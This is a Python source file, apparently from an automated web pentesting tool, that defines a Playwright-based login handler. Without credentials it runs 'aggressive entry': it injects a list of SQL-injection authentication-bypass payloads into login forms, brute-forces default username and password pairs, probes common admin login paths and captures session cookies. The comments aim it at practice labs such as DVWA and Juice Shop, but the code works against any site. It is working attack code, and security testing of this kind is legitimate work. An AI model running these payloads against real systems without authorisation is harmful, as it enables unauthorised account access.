import base64
import asyncio
import json
from playwright.async_api import Page, BrowserContext
from src.core.logger import setup_logger
from src.utils.pen_test_log_builder import VulnerabilityBuilder

class AuthHandler:
    def __init__(self, logger=None):
        self.logger = logger or setup_logger("AuthHandler")
        self.report_builder = VulnerabilityBuilder()
        self.cookies = None
        self.auth_token = None
        # Common default credentials for pentest labs and popular web apps
        self.default_creds = [
            # DVWA / generic labs
            ("admin",    "password"),
            ("admin",    "admin"),
            ("admin",    "admin123"),
            ("admin",    "123456"),
            ("admin",    "password123"),
            # Root variations
            ("root",     "root"),
            ("root",     "toor"),
            # Generic user
            ("user",     "user"),
            ("user",     "password"),
            ("test",     "test"),
            # Juice Shop / OWASP
            ("admin@juice-sh.op", "admin123"),
            # WordPress defaults
            ("admin",    "admin"),
            # WebGoat
            ("guest",    "guest"),
            ("webgoat",  "webgoat"),
            # BWAPP
            ("bee",      "bug"),
        ]
        self.user_selectors = (
            'input[type="email"], input[name*="user"], input[name*="email"], '
            'input#email, input[placeholder*="Email" i], input[name="username"], '
            'input[id*="user" i], input[id*="login" i]'
            'input#username, input[for="username"]'
        )
        self.pass_selectors = 'input[type="password"], input[name*="pass"]'
        self.submit_selectors = (
            'input[type="submit"], button[type="submit"], '
            'button:has-text("Login"), button:has-text("Sign in"), '
            'input[name="Login"], input[value*="Login"], input[value*="Sign"]'
        )
        self.collected_findings = []
        self.last_authenticated_url = None

    async def perform_login(self, page: Page, credentials: dict = None) -> bool:

        has_form = await page.locator(self.pass_selectors).count() > 0
    
        if not has_form:
            self.logger.info("[Auth] 🕵️ No login form detected, searching for login page...")
            paths = [
                # Standard paths
                "/login", "/signin", "/sign-in",
                "/#/login", "/#/signin",
                # PHP / CMS paths
                "/login.php", "/admin/login.php", "/wp-login.php",
                "/administrator", "/admin",
                # App framework paths
                "/user/login", "/account/login", "/auth/login",
                "/users/sign_in", "/session/new",
                # DVWA specific (redirected to login.php at root)
                "/dvwa/login.php",
            ]
            base_url = page.url.split('#')[0].rstrip('/')
            
            for path in paths:
                await page.goto(f"{base_url}{path}", wait_until="networkidle")
                if await page.locator(self.pass_selectors).count() > 0:
                    self.logger.info(f"[Auth] 📍 Found login form at {page.url}")
                    break

        # 1. ลอง Standard Login (ถ้ามี Creds)
        if credentials and credentials.get('username') and credentials.get('password'):
            self.logger.info(f"[Auth] 🔑 Testing Job Credentials...")
            if await self._try_standard_login(page, credentials):
                return True
            # Creds were provided but failed — do NOT fall through to SQLi bypass.
            # Aggressive entry is only appropriate when operating without credentials.
            self.logger.warning("[Auth] ⚠️ Standard login failed with provided credentials. Skipping aggressive entry.")
            return False

        # 2. No credentials provided → try Aggressive Entry (SQLi + Default creds)
        self.logger.info("[Auth] No credentials provided. Attempting Aggressive Entry (SQLi Bypass + Default Creds)...")
        return await self.aggressive_entry(page)

    async def _try_standard_login(self, page: Page, creds: dict) -> bool:
        """ ท่า Login ปกติด้วย Username/Password """
        try:
            await self._dismiss_initial_modals(page)
            # ใช้ Selectors ตัวเดียวกับที่ใช้ใน SQLi Bypass
            user_input = page.locator(self.user_selectors).first
            pass_input = page.locator(self.pass_selectors).first
            # submit_btn = page.locator(self.submit_selectors).first

            if await user_input.is_visible():
                await user_input.fill(creds['username'])
                await pass_input.fill(creds['password'])

                await pass_input.press("Enter")
                
                await page.wait_for_timeout(2000)
                if await self._check_success(page):
                    self.logger.info("✅ Standard Login successful!")
                    await self._capture_session(page)
                    return True
        except Exception as e:
            self.logger.error(f"[-] Standard login error: {e}")
        return False

    async def find_and_login(self, page: Page, creds: dict) -> bool:
        """[ASYNC] ตรวจหาฟอร์มและพยายาม Login"""
        password_input = page.locator('input[type="password"]')
        
        # ตรวจสอบจำนวน element ต้องใช้ await
        if await password_input.count() > 0:
            self.logger.info(f"[Auth] 🕵️ Potential login form detected at {page.url}")
            return await self.login_with_heuristics(page, creds)
        
        login_indicators = 'a:has-text("Login"), a:has-text("Sign in"), button:has-text("Login"), .login-btn'
        login_btn = page.locator(login_indicators).first
        
        if await login_btn.is_visible():
            try:
                await login_btn.click()
                await page.wait_for_load_state("networkidle")
                return await self.login_with_heuristics(page, creds)
            except: pass
            
        return False

    async def login_with_heuristics(self, page: Page, creds: dict) -> bool:
        """[ASYNC] กรอกข้อมูล Login โดยใช้ Heuristics"""
        try:
            user_selector = 'input[type="text"], input[type="email"], input[name*="user"], input[id*="email"]'
            user_input = page.locator(user_selector).first
            pass_input = page.locator('input[type="password"]').first
            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login")').first

            if await user_input.is_visible() and await pass_input.is_visible():
                await user_input.fill(creds.get("username", "admin"))
                await pass_input.fill(creds.get("password", "admin"))
                
                # ใน Async ใช้ asyncio.gather หรือรอแยกกัน
                try:
                    async with page.expect_navigation(timeout=5000):
                        await submit_btn.click()
                except:
                    # ถ้าเว็บเป็น SPA (Juice Shop) มันจะไม่ Navigate หน้าใหม่ ให้กดเฉยๆ แล้วรอ Network นิ่ง
                    await submit_btn.click()
                    await page.wait_for_timeout(2000)
                
                if await self._check_success(page):
                    await self._capture_session(page)
                    self.logger.info("[Auth] ✅ Login Successful!")
                    return True
        except Exception as e:
            self.logger.debug(f"[Auth] Heuristic Login failed: {e}")
        return False

    async def aggressive_entry(self, page: Page) -> bool:
        """[ASYNC] Brute-force และ SQLi Bypass"""
        if await page.locator('input[type="password"]').count() == 0:
            return False

        self.logger.info(f"[Auth] 🛡️ Attempting Aggressive Entry at {page.url}")
        
        if await self._try_sqli_bypass(page): return True
        if await self._try_default_creds(page): return True
        return False

    async def _try_sqli_bypass(self, page: Page) -> bool:
        payloads = [
            # Classic tautology bypass
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1 /*",
            
            # No-Quote bypass
            "1 OR 1=1",
            "admin' OR '1'='1",
            
            # Tautology with different operators
            "' OR 'a'='a",
            "') OR ('a'='a",
            "' || 1=1--",
            
            # Comment variations
            "admin' #",
            "admin'-- -",
            "admin'/*",
            
            # Null Byte & Encoding
            "admin'%00",
            "admin' or 1=1 LIMIT 1;#",
            
            # Username comment
            "admin'--",
            "' UNION SELECT NULL, 'admin', 'password'--",
        ]
        
        user_selectors   = 'input[type="email"], input[name*="user"], input[name*="email"], input#email, input[name="username"]'
        pass_selectors   = 'input[type="password"], input[name*="pass"]'
        # Cover <button> AND <input type="submit"> — DVWA uses the latter
        submit_selectors = (
            'button[type="submit"], button#loginButton, button:has-text("Login"), '
            'input[type="submit"], input[value*="Login"], input[value*="Sign in"]'
        )

        for payload in payloads:
            try:
                # 1. Dismiss modals
                await self._dismiss_initial_modals(page)
                
                # 2. Remember login URL
                current_login_url = page.url

                # 3. Navigate to login page if not already there
                if "login" not in page.url.lower():
                    login_link = page.locator('a:has-text("Login"), a:has-text("Sign in")').first
                    if await login_link.is_visible():
                        await login_link.click()
                        await page.wait_for_load_state("networkidle")
                    else:
                        await page.goto(f"{page.url.split('#')[0]}#/login", wait_until="networkidle")

                # 4. Locate form elements
                user_input = page.locator(user_selectors).first
                pass_input = page.locator(pass_selectors).first
                submit_btn = page.locator(submit_selectors).first

                # Bail early if no username input visible (not a login form)
                if not await user_input.is_visible(timeout=3000):
                    continue

                await user_input.fill(payload)
                await pass_input.fill("anything")
                # Fail fast per payload — DVWA input[type=submit] should respond in <5s
                await submit_btn.click(timeout=5000)
                
                await page.wait_for_timeout(2000)

                # 5. Check login success
                if await self._check_success(page):
                    self.logger.info(f"✅ SQLi Bypass Success with payload: {payload}")
                    
                    # Capture session cookies / token
                    await self._capture_session(page)

                    # Screenshot evidence
                    import base64
                    screenshot_bytes = await page.screenshot(type="jpeg", quality=70)
                    screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')

                    # Build finding report
                    auth_finding = self.report_builder.build(
                        url=current_login_url,
                        param="username",
                        vuln_type="Authentication Bypass via SQL Injection",
                        payload=payload,
                        screenshot=screenshot_b64,
                        details=f"Successfully bypassed authentication using payload: {payload}. This allows unauthorized access to user accounts.",
                        method="POST",
                        severity="CRITICAL"
                    )

                    if hasattr(self, 'collected_findings'):
                        self.collected_findings.append(auth_finding)

                    return True  # Stop trying — one success is enough

            except Exception as e:
                self.logger.error(f"[-] Error during SQLi Bypass attempt: {e}")
                continue
        return False


    async def _capture_session(self, page: Page):
        """เก็บ Cookies และบันทึก URL ล่าสุดไว้"""
        self.cookies = await page.context.cookies()
        self.last_authenticated_url = page.url # 🚩 บันทึก URL ทันทีที่ Login สำเร็จ
        self.logger.debug(f"[Auth] Session & URL ({self.last_authenticated_url}) captured.")

    async def apply_session(self, context: BrowserContext):
        """[ASYNC] โหลด Session เข้า Context ใหม่"""
        if self.cookies:
            await context.add_cookies(self.cookies)
            return True
        return False

    async def _check_success(self, page: Page) -> bool:
        # Generic Check 1: ปรากฏปุ่ม Logout หรือปุ่มที่มีสัญลักษณ์สื่อถึง User Account
        logout_indicators = 'a:has-text("Logout"), button:has-text("Sign out"), a[href*="logout"], .user-profile'
        
        # Generic Check 2: หน้าเว็บมีการเปลี่ยนแปลงจากหน้า Login เดิมชัดเจน (เช่น URL เปลี่ยน)
        url_changed = "login" not in page.url.lower() and "auth" not in page.url.lower()

        # Generic Check 3: มี Cookies ใหม่ที่ถูกตั้งค่าเป็น HttpOnly (ส่วนใหญ่เป็น Session ID)
        cookies = await page.context.cookies()
        has_session_cookie = any(c.get('httpOnly') for c in cookies)

        return (await page.locator(logout_indicators).count() > 0) or (url_changed and has_session_cookie)
    
    async def _try_default_creds(self, page: Page) -> bool:
        self.logger.info("[Auth] 🔑 Testing default credentials...")
        user_input = page.locator('input[type="text"], input[type="email"], input[name*="user"]').first
        pass_input = page.locator('input[type="password"]').first
        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first

        if not await user_input.is_visible(): return False

        for username, password in self.default_creds:
            try:
                await user_input.fill(username)
                await pass_input.fill(password)
                await submit_btn.click()
                await page.wait_for_load_state("networkidle", timeout=5000)

                if await self._check_success(page):
                    await self._capture_session(page)
                    return True
                
                if "login" not in page.url.lower():
                    await page.go_back()
            except: continue
        return False
    
    async def _dismiss_initial_modals(self, page: Page):
        """Generic modal/cookie banner dismissal for any website"""
        # Selectors ordered from most-specific to generic
        dismiss_selectors = [
            # Juice Shop specific
            'button[aria-label="Close Welcome Banner"]',
            'a[aria-label="dismiss cookie message"]',
            # Generic cookie/GDPR banners
            'button:has-text("Accept all")',
            'button:has-text("Accept All")',
            'button:has-text("Accept cookies")',
            'button:has-text("Accept")',
            'button:has-text("Agree")',
            'button:has-text("I agree")',
            'button:has-text("I Accept")',
            'button:has-text("OK")',
            'button:has-text("Got it")',
            'button:has-text("Allow all")',
            'button:has-text("Allow")',
            # Generic close/dismiss buttons
            'button:has-text("Close")',
            'button:has-text("Dismiss")',
            'button[aria-label="Close"]',
            'button[aria-label="close"]',
            '[class*="cookie"] button',
            '[id*="cookie"] button',
            '[class*="consent"] button',
            '[class*="banner"] button',
        ]
        for selector in dismiss_selectors:
            try:
                btn = page.locator(selector).first
                if await btn.is_visible(timeout=500):
                    await btn.click()
                    await page.wait_for_timeout(300)
            except:
                continue
